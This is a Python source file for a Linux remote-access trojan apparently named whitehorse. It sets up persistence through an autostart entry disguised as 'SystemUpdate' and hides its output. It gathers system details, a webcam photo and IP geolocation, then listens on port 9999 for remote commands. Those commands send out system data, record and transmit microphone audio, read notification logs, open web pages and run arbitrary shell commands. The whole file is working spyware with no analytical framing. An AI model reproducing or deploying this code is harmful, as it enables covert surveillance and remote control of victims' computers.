#imports
import platform
import socket
import getpass
import os
import sys
import time
import cv2
import subprocess
import webbrowser

import importlib.util


def run_command(command):
    result = subprocess.run(
        command,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )
    return result.returncode == 0


def is_python_package_installed(package_name):
    return importlib.util.find_spec(package_name) is not None


def ensure_system_package(package_name):
    # Check if installed (Debian/Ubuntu)
    check = run_command(["dpkg", "-s", package_name])
    if not check:

        return run_command(["sudo", "apt-get", "install", "-y", package_name])
    return True


def ensure_python_package(package_name):
    if not is_python_package_installed(package_name):

        return run_command([sys.executable, "-m", "pip", "install", package_name])
    return True



if (
    ensure_system_package("libgl1-mesa-glx")
    and ensure_system_package("python3-pip")
    and ensure_python_package("opencv-python")
):

#################


    pwd = os.getcwd()
    autostart_path = os.path.expanduser("~/.config/autostart")

    if not os.path.exists(autostart_path):
        os.makedirs(autostart_path)
    auto_files = os.listdir(autostart_path)

    if "whitehorse.desktop" """not""" in auto_files:

        script_path = os.path.join(pwd, "whitehorse.py")

        camm = (f'echo -e "[Desktop Entry]\\nType=Application\\nName=SystemUpdate\\n'
                f'Exec=python3 -c \\"import subprocess; subprocess.Popen([\'python3\', \'{script_path}\'], '
                f'stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)\\"\\n'
                f'Terminal=false\\nX-GNOME-Autostart-enabled=true" > {autostart_path}/whitehorse.desktop')

        os.system(camm)
        os.system(f"chmod +x {autostart_path}/whitehorse.desktop")


    sys.stdout = open(os.devnull, 'w')
    sys.stderr = open(os.devnull, 'w')


    #info
    user = getpass.getuser()
    pcname = socket.gethostname()
    os_name = platform.system()
    osv = platform.version()
    osr = platform.release()
    mt = platform.machine()
    core = platform.processor()
    sa = platform.architecture()[0]
    pwd = os.getcwd()
    home = os.path.expanduser("~")
    pt = sys.platform
    date = time.strftime("%d-%m-%Y")
    ctime = time.strftime("%H:%M:%S")
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    ip = s.getsockname()[0]
    s.close()


    #cam setup

    cam = cv2.VideoCapture(0)
    os.system('clear')
    if not cam.isOpened():
        print("")
    time.sleep(2)
    ret, frame = cam.read()
    if cam.isOpened():
        if ret:
            filename = "photo.png"
            cv2.imwrite(filename, frame)
        os.system('clear')
        cam.release()
        cv2.destroyAllWindows()


    #port setup

    PORT = 9999
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("0.0.0.0", PORT))
    server.listen(5)
    os.system('clear')
    #data

    #info setup

    info = (
        "User = " + user,
        "PC Name = " + pcname,
        "OS = " + os_name,
        "OS Version = " + osv,
        "OS Release = " + osr,
        "Machine Type = " + mt,
        "Processor = " + core,
        "System Architecture = " + sa,
        "Current Directory = " + pwd,
        "Home Directory = " + home,
        "Platform = " + pt,
        "Date = " + date,
        "Time = " + ctime,
        "IP = "+ip
    )

    data = "\n".join(info)

    #location setup

    loct = subprocess.run(['curl', '-s', 'http://ip-api.com/json'], capture_output=True, text=True)
    loc = loct.stdout.replace("{", "").replace("}", "").replace(",", "\n").replace('"', " ")


    #main
    try:
        while True:

            ls = os.listdir()
            if "photo.png" in ls:
                os.remove('photo.png')

            conn, addr = server.accept()

            try:
                command = conn.recv(1024).decode().strip()

                if command == "info":
                    data = data
                    conn.sendall(data.encode())

                elif command == "cam":

                    conn.sendall(b"Camera data placeholder")


                elif command == "rec":

                    filename = "record.mp4"
                    ffmpeg_path = "/usr/bin/ffmpeg"

                    cmd = [ffmpeg_path, "-f", "pulse", "-i", "default", "-t", "15", "-y", filename]

                    try:
                        # Run recording
                        subprocess.run(cmd, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

                        # SEND THE FILE
                        if os.path.exists(filename):
                            with open(filename, "rb") as f:
                                file_data = f.read()
                                conn.sendall(file_data) # This sends the actual file bytes

                            os.remove(filename) # Clean up
                        else:
                            conn.sendall(b"Error: File not created.")
                    except Exception as e:

                        conn.sendall(f"Error: {str(e)}".encode())


                elif command == "msg":
                    # This searches the system log for notification entries
                    cmdd = "journalctl _SENDER=org.freedesktop.Notifications -n 15 --no-pager"
                    try:
                        output = subprocess.check_output(cmdd, shell=True, text=True)
                        if not output:
                            output = "No notifications found in logs."
                        conn.sendall(output.encode())
                    except Exception as e:
                        conn.sendall(f"Error: {e}".encode())

                elif "web" in command:
                    web = command.replace("web", "")
                    if "http" in web:
                        webbrowser.open_new_tab(web)
                        continue
                    else:
                        domine = "https://"
                        webs = (domine+web)
                        webbrowser.open_new_tab(webs)
                        continue

                elif command == "del":

                    os.remove("info.py")

                elif command == "loc":
                    conn.sendall(loc.encode())

                elif "terminal" in command:
                    terminal = command.replace("terminal","")
                    os.system(terminal)
                    

            except Exception as e:
                conn.sendall(f"Error: {e}".encode())
            finally:
                conn.close()


    except KeyboardInterrupt:
        conn.sendall("[!] Server shutting down.".encode())
    finally:
        server.close()

else:
    os.system("clear")

